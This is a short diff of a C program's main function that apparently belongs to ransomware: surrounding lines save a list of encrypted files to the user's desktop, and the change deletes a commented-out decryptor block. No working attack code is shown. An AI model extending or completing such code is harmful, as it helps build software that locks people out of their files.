@@ -34,12 +34,6 @@ int main(){
     save_into_file_encrypted_list(encrypted, desktop);
     destroy(&encrypted);
 
-    /* Decryptor */
-    //read_from_file_encrypted_files(&encrypted, desktop);
-    //print(encrypted);
-    //decrypt_files(encrypted);
-    //destroy(&encrypted);
-
     /* Free the memory */
     free(home);
     free(desktop);
